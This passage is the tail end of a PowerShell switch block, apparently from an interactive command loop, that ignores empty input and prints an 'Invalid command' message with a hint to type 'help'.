        "^$" { }
        default {
            Write-Host "Invalid command: $Command" -ForegroundColor DarkRed
            Write-Host "Type 'help' for a list of available commands" -ForegroundColor DarkRed
        }
    }

}

